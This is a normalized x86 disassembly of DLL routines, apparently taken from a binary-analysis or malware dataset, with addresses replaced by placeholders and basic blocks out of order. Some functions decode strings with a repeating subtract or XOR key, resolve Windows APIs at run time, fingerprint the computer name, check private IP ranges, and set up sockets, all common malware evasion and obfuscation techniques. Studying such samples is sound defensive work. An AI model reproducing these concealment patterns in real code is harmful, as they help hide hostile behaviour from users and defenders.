mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
xor esi esi
call eax
test eax eax
je r-xdata
cmp [ ebx + 0x10 ] edi
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
inc esi
call eax
cmp esi eax
jb r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
mov [ ebx + 0xc ] eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov [ ebx + 0x10 ] eax
cmp eax edi
jne r-xdata
mov ecx [ ebx + 0xc ]
cmp ecx edi
je r-xdata
mov [ ebx + 0xc ] edi
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_1000c280
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bf88
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000c320
push ebp
mov ebp esp
push ebx
mov ebx ecx
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov ax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0x10 ] 0x0
je r-xdata
push edi
xor edi edi
push esi
mov ax si
pop esi
pop edi
pop ebx
pop ebp
retn 0x8
inc edi
cmp edi 0xf
jb r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ edi + eax ]
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
movzx esi cx
mov ecx [ ebx + 0x10 ]
mov edx [ ecx ]
mov edx [ edx + 0xc ]
push eax
push esi
call edx
test eax eax
jne r-xdata
mov ax [ ebp + 0x8 ]
pop esi
pop edi
pop ebx
pop ebp
retn 0x8
sub_1000c380
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x0
jne r-xdata
cmp [ edi + 0xc ] 0x0
push ebx
push esi
jne r-xdata
mov eax 0x1
pop edi
retn
pop esi
pop ebx
mov eax 0x1
pop edi
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov ebx 0x1
xor esi esi
call edx
test eax eax
je r-xdata
pop esi
pop ebx
xor eax eax
pop edi
retn
lea ecx [ ecx ]
mov ecx [ edi + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
inc esi
call edx
cmp esi eax
jb r-xdata
mov edx eax
and edx 0xa000000
cmp edx 0xa000000
je r-xdata
mov ecx [ edi + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
mov ecx eax
and ecx 0xc0a80000
cmp ecx 0xc0a80000
je r-xdata
test ebx ebx
je r-xdata
and eax 0xac100000
cmp eax 0xac100000
je r-xdata
xor ebx ebx
sub_1000c410
push esi
mov esi eax
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax edi
call sub_1000c470
sub esi ecx
sar esi 0x1
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x2
pop esi
retn
mov cx [ esi ]
mov [ eax ] cx
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax edi
call sub_1000c470
mov ecx [ edi ]
mov dx [ ecx + esi * 2 ]
mov [ eax ] dx
add [ edi + 0x4 ] 0x2
pop esi
retn
sub_1000c470
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x1
cmp eax 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x1
cmp eax ecx
jbe r-xdata
push r--data
call sub_100126ab
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x7fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_1000c4c0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1000c4c0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x7fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x1
cmp eax ecx
jae r-xdata
push r--data
call sub_100126ab
pop ebp
retn 0x4
push ebx
push edi
call sub_100109b0
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x1
add ecx ecx
push ecx
push eax
push ebx
call sub_100128c0
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x1
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 2 ]
lea eax [ ebx + edx * 2 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_10012c4b
add esp 0x4
sub_1000c530
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bd90
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov edx [ edx + 0x4 ]
push eax
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1000c590
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c320
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x0
call sub_10007e80
add esp 0x8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000c640
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000c680
push ebp
mov ebp esp
sub esp 0x10
cmp [ rw-data ] 0x0
mov [ ebp - 0x10 ] rw-data
mov [ ebp - 0x8 ] rw-data
mov [ ebp - 0x4 ] rw-data
je r-xdata
mov esp ebp
pop ebp
retn
push ebx
push edi
lea ebx [ ebx ]
lea ecx [ edi + 0x1 ]
mov [ ebp - 0xc ] edi
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
sub edi ecx
lea ecx [ edi + 0x1 ]
push ecx
call sub_10012ca7
mov edx [ ebp - 0xc ]
push edi
mov ebx eax
push edx
push ebx
call sub_10018b70
add esp 0x10
mov [ edi + ebx ] 0x0
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
mov [ ebp - 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0xc ] ebx
xor ecx ecx
test edi edi
je r-xdata
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x8 ] edi
jmp r-xdata
xor edx edx
mov eax ecx
div [ esi + 0x4 ]
mov eax [ esi ]
inc ecx
mov dl [ edx + eax ]
sub [ ecx + ebx - 0x1 ] dl
cmp ecx edi
jb r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
sub edi ecx
lea ecx [ edi + 0x1 ]
push ecx
call sub_10012ca7
mov edx [ ebp - 0x8 ]
push edi
mov ebx eax
push edx
push ebx
call sub_10018b70
add esp 0x10
mov [ edi + ebx ] 0x0
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
mov [ ebp - 0x10 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x8 ] ebx
xor ecx ecx
test edi edi
je r-xdata
lea ecx [ edi + 0x1 ]
nop
xor ebx ebx
jmp r-xdata
xor edx edx
mov eax ecx
div [ esi + 0x4 ]
mov eax [ esi ]
inc ecx
mov dl [ edx + eax ]
sub [ ecx + ebx - 0x1 ] dl
cmp ecx edi
jb r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
sub edi ecx
lea ecx [ edi + 0x1 ]
push ecx
call sub_10012ca7
mov edx [ ebp - 0x10 ]
push edi
mov ebx eax
push edx
push ebx
call sub_10018b70
add esp 0x10
mov [ edi + ebx ] 0x0
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov ecx [ ebp - 0xc ]
call sub_10004bb0
mov eax [ ebp - 0x4 ]
add eax 0x4
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
add ecx 0x4
cmp [ eax ] 0x0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
xor ecx ecx
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov [ ebp - 0xc ] edi
test edi edi
jne r-xdata
pop edi
pop ebx
xor edx edx
mov eax ecx
div [ esi + 0x4 ]
mov eax [ esi ]
inc ecx
mov dl [ edx + eax ]
sub [ ecx + ebx - 0x1 ] dl
cmp ecx edi
jb r-xdata
sub_1000c800
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d53a
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
xor ebx ebx
push 0x10
mov [ ebp - 0x4 ] ebx
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov [ ebp - 0x78 ] ebx
push eax
call sub_10001600
mov [ ebp - 0x78 ] eax
jmp r-xdata
mov [ ebp - 0x70 ] ebx
mov ecx [ ebp - 0x78 ]
mov edi eax
call sub_10005010
mov [ ebp - 0x70 ] eax
jmp r-xdata
push 0x24
mov [ ebp - 0x4 ] 0x0
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
call sub_1000cd50
push 0x18
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ecx esi
call edx
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_100099f0
mov esi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x74 ] ebx
mov eax ebx
push eax
call sub_1000c1b0
mov [ ebp - 0x74 ] eax
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
push r--data
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x88 ] 0x10006
call sub_10013848
mov edx [ ebp - 0x70 ]
mov ebx r--data
mov edi 0xc
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x7c ] edi
mov [ ebp - 0x90 ] r--data
mov [ ebp - 0x8c ] edx
push 0x4d3
mov [ ebp - 0x4 ] 0x4
call sub_10012ca7
add esp 0x4
push 0x4d2
mov esi eax
push rw-data
push esi
call sub_10018b70
add esp 0xc
mov [ esi + 0x4d2 ] 0x0
xor ecx ecx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
call eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp eax ebx
je r-xdata
push 0x10
call sub_10012ca7
mov edi eax
add esp 0x4
mov [ ebp - 0x6c ] edi
xor eax eax
cmp edi eax
je r-xdata
mov eax ecx
xor edx edx
div edi
mov al [ edx + ebx ]
sub [ ecx + esi ] al
inc ecx
jmp r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x84 ] 0x10006
call sub_10013848
xor edi edi
mov [ edi + 0x4 ] rw-data
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] eax
mov eax esi
mov [ ebp - 0x4 ] 0x6
mov esi edi
mov [ edi ] r--data
call sub_10007fa0
jmp r-xdata
cmp ecx 0x4d2
jae r-xdata
mov [ ebp - 0x6c ] 0x0
push esi
mov ecx edi
mov edx rw-data
call sub_100081f0
mov [ esi ] r--data
mov [ ebp - 0x6c ] esi
jmp r-xdata
push 0x1c
mov [ ebp - 0x4 ] 0x4
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x4 ] 0x7
test esi esi
je r-xdata
mov ebx [ ebp - 0x9c ]
sub ebx [ ebp - 0xa0 ]
sar ebx 0x2
call sub_1000cc90
mov ecx [ ebp - 0x6c ]
xor edi edi
mov [ ebp - 0xd4 ] ecx
lea edx [ ebp - 0xac ]
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0xdc ] r--data
mov [ ebp - 0xd8 ] r--data
mov [ ebp - 0xd0 ] edx
mov [ ebp - 0xcc ] edi
mov [ ebp - 0xc8 ] edi
mov [ ebp - 0xc4 ] 0x12c
mov [ ebp - 0xc0 ] ecx
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] edi
mov [ ebp - 0xb4 ] si
mov [ ebp - 0x4 ] 0xd
mov esi [ ebp - 0x70 ]
mov edx [ esi ]
mov edx [ edx + 0x4 ]
lea eax [ ebp - 0xdc ]
push eax
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0xd8 ] r--data
mov [ ebp - 0xdc ] r--data
mov [ ebp - 0x4 ] 0x9
call sub_10004cf0
mov [ ebp - 0x54 ] r--data
mov [ ebp - 0x4 ] 0xe
mov ecx [ ebp - 0x50 ]
mov eax [ ecx ]
mov edx [ ebp - 0x40 ]
mov eax [ eax + 0x10 ]
push edx
call eax
mov ecx [ ebp - 0x40 ]
cmp ecx edi
je r-xdata
push 0x9
mov edi 0x8
call sub_10012ca7
mov ecx [ r--data ]
mov esi eax
mov [ esi ] ecx
mov edx [ r--data ]
add esp 0x4
cmp [ ebp - 0x7c ] 0x0
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] 0x0
je r-xdata
xor eax eax
mov esi eax
mov edi eax
mov ecx 0x2
mov [ ebp - 0x24 ] eax
push eax
mov [ ebp - 0x28 ] r--data
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x24 ] cx
call [ htons@IAT ]
push edi
mov [ ebp - 0x22 ] ax
call [ htonl@IAT ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x8
mov edx [ ebp - 0x24 ]
sub esp 0x14
mov ecx esp
mov [ ecx ] r--data
mov [ ecx ] r--data
mov [ ecx + 0x4 ] edx
mov edx [ ebp - 0x6c ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] esi
mov [ ecx + 0x10 ] edi
mov edi [ ebp - 0x78 ]
lea eax [ ebp - 0x90 ]
mov [ ebp - 0xe0 ] esp
push eax
mov ecx edi
lea esi [ ebp - 0x54 ]
call sub_10007cd0
mov [ ebp - 0xa8 ] edi
xor edi edi
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0xac ] ecx
mov [ ebp - 0xa4 ] r--data
mov [ ebp - 0xa0 ] edi
mov [ ebp - 0x9c ] edi
mov [ ebp - 0x98 ] edi
lea edx [ ebp - 0xa4 ]
push edx
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000c680
add esp 0x4
lea eax [ ebp - 0x68 ]
lea ecx [ ebp - 0x54 ]
call sub_1000c600
mov [ ebp - 0x4 ] 0xb
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x10 ]
call eax
movzx eax ax
mov esi eax
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x74 ] edi
je r-xdata
mov ecx [ ebp - 0x50 ]
mov edx [ ecx ]
mov eax [ ebp - 0x44 ]
mov edx [ edx + 0x20 ]
push eax
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov edi [ ebp - 0x74 ]
mov edx [ edi ]
mov eax [ edx + 0x8 ]
push esi
mov ecx edi
call eax
lea eax [ ebp - 0x68 ]
lea ecx [ ebp - 0x54 ]
call sub_1000c600
mov [ ebp - 0x4 ] 0xc
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x10 ]
call eax
mov edx [ edi ]
movzx eax ax
push esi
push eax
mov eax [ edx + 0xc ]
mov ecx edi
call eax
movzx eax ax
mov [ ebp - 0x4 ] 0xa
mov edx [ edi ]
mov esi eax
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
xor ecx ecx
mov eax ecx
xor edx edx
div [ ebp - 0x7c ]
mov al [ edx + ebx ]
sub [ ecx + esi ] al
inc ecx
jmp r-xdata
cmp ecx edi
jae r-xdata
sub_1000cc90
push ebp
mov ebp esp
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test ebx ebx
jne r-xdata
push esi
push 0x400
xor esi esi
lea eax [ ebp - 0x404 ]
push esi
push eax
mov [ ebp - 0x408 ] 0x400
call sub_10018220
add esp 0xc
lea ecx [ ebp - 0x408 ]
push ecx
lea edx [ ebp - 0x404 ]
push edx
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
push edi
xor ecx ecx
lea edi [ eax + 0x1 ]
lea esp [ esp ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
pop edi
je r-xdata
mov eax esi
xor edx edx
div ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
mov eax edx
call sub_10012771
mov esp ebp
pop ebp
retn
lea esp [ esp ]
movsx edx [ ebp + ecx - 0x404 ]
inc ecx
add esi edx
cmp ecx eax
jb r-xdata
sub_1000cd50
push ebp
mov ebp esp
push ecx
push esi
call sub_100039a0
mov esi eax
test esi esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0xc ]
mov ecx esi
call eax
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x10006
call sub_10013848
push r--data
lea ecx [ ebp - 0x4 ]
push ecx
mov [ ebp - 0x4 ] 0x10006
call sub_10013848
sub_1000cdc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov ecx [ eax + 0x8 ]
push ecx
mov ecx [ eax + 0x4 ]
call sub_1000c590
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
push esi
lea edx [ edi + 0x4 ]
push edx
call sub_1000c530
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
mov [ edi + 0x20 ] 0x1
sub_1000ce00
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi + 0x4 ] r--data
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000ce30
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor eax eax
push edi
mov edi ecx
movzx ecx [ esi + 0x28 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push 0xa
lea eax [ ebp - 0xc ]
push eax
push ecx
call sub_1001aa33
mov edx [ edi ]
mov edx [ edx + 0x10 ]
add esp 0xc
lea eax [ ebp - 0xc ]
push eax
push r--data
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0xc ]
mov ecx edi
call edx
mov ebx [ esi + 0xc ]
lea eax [ esi + 0x4 ]
push eax
call sub_10003f80
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10012771
mov esp ebp
pop ebp
retn
sub_1000ceb0
push ebp
mov ebp esp
push esi
mov esi eax
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
mov edi [ esi + 0x20 ]
call edx
cmp edi eax
jae r-xdata
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push 0x0
push 0x1e
push eax
push edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] eax
call sub_1001af30
mov ecx 0xa
sub ecx eax
mov edx ecx
shl edx 0x4
sub edx ecx
lea eax [ edi + edx * 2 ]
pop edi
mov [ esi + 0x18 ] eax
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push edi
call edx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x14 ]
call eax
mov edi eax
mov ecx edi
call sub_1000ce30
test edi edi
je r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
sub_1000cf30
push ebp
mov ebp esp
push esi
mov esi ecx
mov edx [ esi + 0x10 ]
push edi
mov edi [ esi + 0x14 ]
mov eax edx
or eax edi
jne r-xdata
mov ecx [ esi + 0x18 ]
xor eax eax
add ecx edx
adc eax edi
mov edi [ ebp + 0x8 ]
xor edx edx
cmp eax edx
jg r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
mov eax esi
call sub_1000ceb0
pop edi
pop esi
pop ebp
retn 0x8
pop edi
pop esi
pop ebp
retn 0x8
jl r-xdata
cmp [ esi + 0x24 ] edx
jne r-xdata
cmp ecx edi
jae r-xdata
mov eax [ ebp + 0xc ]
push eax
push edi
mov eax esi
call sub_1000ceb0
mov ecx [ esi + 0x1c ]
inc [ esi + 0x20 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
cmp [ esi + 0x20 ] eax
jb r-xdata
mov [ esi + 0x20 ] 0x0
sub_1000cfb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx ecx
mov [ ebp - 0x4 ] ebx
cmp esi 0x4
jae r-xdata
push edi
add esi 0xfffffffc
push esi
call sub_10012ca7
mov edi eax
add esp 0x4
xor eax eax
test esi esi
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor eax eax
call sub_10011c70
mov ebx eax
mov eax 0x1
call sub_10011c70
push ebx
mov [ ebp + 0xc ] eax
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
mov ecx eax
and ecx 0x3
mov dl [ ecx + ebx + 0x8 ]
mov ecx [ ebp + 0x8 ]
xor dl [ ecx + eax + 0x4 ]
inc eax
mov [ eax + edi - 0x1 ] dl
cmp eax esi
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp eax [ ecx ]
je r-xdata
mov edx [ ebp + 0xc ]
push edx
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
push edi
call edx
push edi
mov esi eax
call sub_10012c4b
add esp 0x4
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push edi
call sub_10012c4b
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
push edi
push 0x0
call eax
sub_1000d080
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bf88
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000d0f0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi [ ebp + 0x10 ]
push esi
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx + 0x4 ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ecx ]
mov eax [ eax + 0xc ]
push edx
call eax
test eax eax
jne r-xdata
mov ecx [ esi ]
mov edx [ ebp - 0x4 ]
push ebx
push edi
xor eax eax
mov [ ebp + 0x10 ] ecx
mov [ ebp + 0x8 ] edx
call sub_10011c70
mov edi eax
mov eax 0x1
call sub_10011c70
push edi
mov ebx eax
call [ GetModuleHandleA@IAT ]
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn 0xc
push ebx
push eax
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
push 0x0
call eax
mov ebx eax
xor ebx ebx
jmp r-xdata
mov eax [ esi ]
add eax 0x4
push eax
call sub_10012ca7
mov edi [ ebp + 0xc ]
mov [ edi ] eax
xor eax eax
add esp 0x4
cmp [ esi ] eax
jbe r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_10012c4b
mov ecx [ edi ]
add esp 0x4
pop edi
mov [ ecx ] ebx
add [ esi ] 0x4
pop ebx
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0xc
lea ebx [ ebx ]
mov edx [ ebp - 0x8 ]
mov ecx eax
and ecx 0x3
mov cl [ ecx + edx + 0x8 ]
mov edx [ ebp - 0x4 ]
xor cl [ eax + edx ]
mov edx [ edi ]
mov [ edx + eax + 0x4 ] cl
inc eax
cmp eax [ esi ]
jb r-xdata
sub_1000d1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001ccde
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x50
call sub_10012ca7
mov ebx eax
add esp 0x4
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
lea edi [ ebx + 0x4 ]
mov [ ebp - 0x4 ] 0x1
push edi
mov [ ebx ] r--data
call sub_1000dea0
lea ecx [ edi + 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000f090
lea ecx [ edi + 0x24 ]
xor esi esi
mov eax r--data
call sub_10004db0
mov [ edi + 0x20 ] 0x1
mov eax ebx
sub_1000d270
push ebp
